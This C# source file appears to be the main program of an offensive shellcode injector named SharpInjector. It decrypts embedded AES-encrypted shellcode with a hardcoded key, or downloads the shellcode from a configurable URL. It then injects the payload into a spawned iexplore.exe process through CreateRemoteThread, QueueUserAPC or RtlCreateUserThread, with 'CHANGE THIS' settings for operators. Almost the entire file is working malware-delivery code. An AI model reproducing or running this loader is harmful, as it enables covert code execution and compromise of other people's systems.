using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Net;


namespace SharpInjector
{
    class Program
    {

        static void Main(string[] args)
        {

            const ExecutionMethod exeMethod = ExecutionMethod.QueueUserAPC; // CHANGE THIS; shellcode exectuon method

            string ParentName = "explorer"; // CHANGE THIS: name of parent process
            string ProgramPath = @"C:\Program Files\Internet Explorer\iexplore.exe"; // CHANGE THIS: path to process shellcode will be injected into
            string ShellcodeUrl = ""; // CHANGE THIS; URL of encrypted shellcode if downloading from web

            // Read the encrypted shellcode in Shellycode.cs
            EncryptedShellcode sc = new EncryptedShellcode();
            string EncryptedShellcode = sc.EncSc;

            // If shellcode does not exist within Shellycode.cs, download from web
            if (EncryptedShellcode == "")
            {
                Console.WriteLine("[*] No encrypted shellcode found in Shellycode.cs");
                Console.WriteLine($"[*] Downloading encrypted shellcode from {ShellcodeUrl}");
                try
                {
                    WebClient wc = new System.Net.WebClient();
                    EncryptedShellcode = wc.DownloadString(ShellcodeUrl);
                    Console.WriteLine("[*] Shellcode downloaded");
                }
                catch
                {
                    Console.WriteLine("[!] Error downloading shellcode!");
                    Environment.Exit(1);
                }
            }
            else
            {
                Console.WriteLine("[*] Encrypted shellcode found in Shellycode.cs");
            }

            // Decrypt and decode the shellcode for our byte array
            string ShellcodeB64 = Dec(EncryptedShellcode);
            byte[] Shellcode = Convert.FromBase64String(ShellcodeB64);

            // pass shellcode to our execution function
            switch (exeMethod)
            {
                case ExecutionMethod.CreateRemoteThread:
                    Console.WriteLine("[*] Execution method: CreateRemoteThread");
                    CreateRemoteThread.ExecuteCreateRemoteThread(ParentName, ProgramPath, Shellcode);
                    break;

                case ExecutionMethod.QueueUserAPC:
                    Console.WriteLine("[*] Execution method: QueueUserAPC");
                    QueueUserAPC.ExecuteQueueUserAPC(ParentName, ProgramPath, Shellcode);
                    break;

                case ExecutionMethod.RtlCreateUserThread:
                    Console.WriteLine("[*] Execution method: RtlCreateUserThread");
                    RtlCreateUserThread.ExecuteRtlCreateUserThread(ParentName, ProgramPath, Shellcode);
                    break;

            }

        }

        // Decryptor func
        public static string Dec(string ciphertext)
        {
            string key = "Thisismytestkey1"; // CHANGE THIS 16/24/32 BYTE VALUE TO MATCH ENCRYPTION KEY

            byte[] iv = new byte[16];
            byte[] buffer = Convert.FromBase64String(ciphertext);

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;

                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream ms = new MemoryStream(buffer))
                {
                    using (CryptoStream cs = new CryptoStream((Stream)ms, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader((Stream)cs))
                        {
                            return sr.ReadToEnd();
                        }
                    }
                }
            }
        }

        // Execution Types
        public enum ExecutionMethod
        {
            CreateRemoteThread,
            QueueUserAPC,
            RtlCreateUserThread
        }

    }

}
